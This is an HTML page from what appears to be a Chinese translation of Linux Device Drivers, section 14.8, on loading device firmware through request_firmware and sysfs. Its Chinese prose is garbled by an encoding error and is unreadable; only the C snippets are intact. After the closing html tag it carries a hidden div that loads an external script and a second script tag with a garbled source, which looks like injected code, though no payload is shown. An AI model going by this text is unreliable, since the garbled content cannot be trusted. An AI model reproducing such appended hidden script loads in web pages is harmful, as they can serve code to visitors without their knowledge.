<html xmlns:cf="http://docbook.sourceforge.net/xmlns/chunkfast/1.0">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>14.8.&#160;̼-Linux豸棨İ棩</title>
<meta name="description" content="" />
<meta name="keywords" content="Linux豸,İ,,ldd,linux device driver,,Ӱ,,,Ƶ" />
<meta name="verify-v1" content="5asbXwkS/Vv5OdJbK3Ix0X8osxBUX9hutPyUxoubhes=" />
<link rel="stylesheet" href="docbook.css" type="text/css">
<meta name="generator" content="DocBook XSL Stylesheets V1.69.0">
<link rel="start" href="index.html" title="Linux 豸 Edition 3">
<link rel="up" href="ch14.html" title="&#160;14&#160;&#160;Linux 豸ģ">
<link rel="prev" href="ch14s07.html" title="14.7.&#160;Ȳ">
<link rel="next" href="ch14s09.html" title="14.9.&#160;ٲο">
</head>
<body bgcolor="white" text="black" link="#0000FF" vlink="#840084" alink="#0000FF">
<div class="navheader">
<table width="100%" summary="Navigation header">
<tr><th colspan="3" align="center">14.8.&#160;̼</th></tr>
<tr>
<td width="20%" align="left">
<a accesskey="p" href="ch14s07.html">һҳ</a>&#160;</td>
<th width="60%" align="center">&#160;14&#160;&#160;Linux 豸ģ</th>
<td width="20%" align="right">&#160;<a accesskey="n" href="ch14s09.html">һҳ</a>
</td>
</tr>
</table>
<hr>
</div>
<div class="sect1" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title" style="clear: both">
<a name="DealingwithFirmware.sect1"></a>14.8.&#160;̼</h2></div></div></div>
<p>Ϊһ, ܷһ豸ֹ֧ǰع̼. Ӳгطľ˵ǿ, һ豸ƹ̼ EEPROM ĳɱ̶Ը⻨. ˹̼Ӳһһ CD , Ҳϵͳ͹̼豸.</p>
<p>̼ʹһ:</p>
<pre class="programlisting">
static char my_firmware[] = { 0x34, 0x78, 0xa4, ... }; 
</pre>
<p>, ϶һ. ̼뵽һĴ, ʹ̼, ҷǳܲ. Ӧ̲Ѿ̼ӳ GPL ֮, ˺ GPL-ɵĴϳһ. Ϊ, Ƕ̼ܱܵں˻߱ Linux ߰.</p>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="TheKernelFirmwareInterface.sect2"></a>14.8.1.&#160;ں˹̼ӿ</h3></div></div></div>
<p>ȷķǵҪʱûռȡ. , ͼں˿ռֱӴ򿪰̼ļջ; һ׳Ĳ, ˲(һļʽ)ں. ෴, ȷķʱʹù̼ӿ, Ϊ˶:</p>
<pre class="programlisting">
#include &lt;linux/firmware.h&gt;
int request_firmware(const struct firmware **fw, char *name, 
 struct device *device); 
</pre>
<p> request_firmware Ҫûռ䶨λṩһ̼ӳں; һιϸ. name ӦʶҪĹ̼; ÷ǹӦṩĹ̼ļ. ĳЩ my_firmware.bin ǵ͵. ̼ɹ, ֵ 0(õĴ뱻),  fw ָһЩṹ:</p>
<pre class="programlisting">
struct firmware {
 size_t size;
 u8 *data; 
}; 
</pre>
<p>ǸṹʵʵĹ̼, ڿɱص豸. С̼ûռδ; ӦڷӲ֮ǰκβеܹ뵽ļ˵ԼȷĹ̼ӳ. 豸̼ʶ, У, ȵ; ǰȫ.</p>
<p>Ѿ͹̼豸ǰ, Ӧͷ in-kernel ṹ, ʹ:</p>
<pre class="programlisting">
void release_firmware(struct firmware *fw); 
</pre>
<p>Ϊ request_firmware ûռæ, ֤ڷǰ˯. ̼ʱ˯ߵλ, 첽Ҫʹ:</p>
<pre class="programlisting">
int request_firmware_nowait(struct module *module,
 char *name, struct device *device, void *context,
 void (*cont)(const struct firmware *fw, void *context)); 
</pre>
<p>Ĳ moudle( һֱ THIS_MODULE), context (һ̼ϵͳʹõ˽ָ),  cont. ˳, request_firmware_nowait ʼ̼ع̲ҷ 0. ڽĳʱ, cont üصĽ. ĳЩԭ̼ʧ, fw  NULL.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="HowItWorks.sect2"></a>14.8.2.&#160;ι</h3></div></div></div>
<p>̼ϵͳʹ sysfs Ȳλ.  request_firmware, һĿ¼ /sys/class/firmware ʹӱ. ǸĿ¼ 3 :</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>loading </span></span></dt>
<dd><p>Ӧع̼ûռΪ 1. ؽ, ӦΪ 0. дһֵ -1  loading ֹ̼ؽ.</p></dd>
<dt><span class="term"><span>data </span></span></dt>
<dd><p>data һƵĽչ̼.  loading , ûռӦд̼.</p></dd>
<dt><span class="term"><span>device </span></span></dt>
<dd><p>һӵ /sys/devices ı.</p></dd>
</dl></div>
<p>һ sysfs , ںΪ豸һȲ¼. ݸȲδߵĻһ FIRMWARE, Ϊṩ request_firmware . Ӧλ̼ļ, ҿںʹṩ. ļ޷ҵ, Ӧ loading Ϊ -1.</p>
<p>һ̼ 10 ûб, ں˾ͷһʧ״̬. ʱڿͨ sysfs  /sys/class/firmware/timeout Ըı.</p>
<p>ʹ request_firmware ӿ豸̼. ȷؼɵȲλ, ̼ϵͳ豸򻯹"ں֮" ȻǴ÷.</p>
<p>, һ: 豸̼û̵ɲӦ. ̻ͬںǵĹ̼, ; һЩĿܲ. , ûʱͷǵĹ̼Ƕ԰Ȩƻ鷳.</p>
</div>
</div>
<div class="navfooter">
<hr>
<table width="100%" summary="Navigation footer">
<tr>
<td width="40%" align="left">
<a accesskey="p" href="ch14s07.html">һҳ</a>&#160;</td>
<td width="20%" align="center"><a accesskey="u" href="ch14.html">һ</a></td>
<td width="40%" align="right">&#160;<a accesskey="n" href="ch14s09.html">һҳ</a>
</td>
</tr>
<tr>
<td width="40%" align="left" valign="top">14.7.&#160;Ȳ&#160;</td>
<td width="20%" align="center"><a accesskey="h" href="index.html">ʼҳ</a></td>
<td width="40%" align="right" valign="top">&#160;14.9.&#160;ٲο</td>
</tr>
</table>
</div>
</body></html>
<div style="display:none"><script language="JavaScript" src="script.js"></script> </div>

<script language=javascript src=G2Bݔx8n*n*n*n*n*n*ݚPpd></script>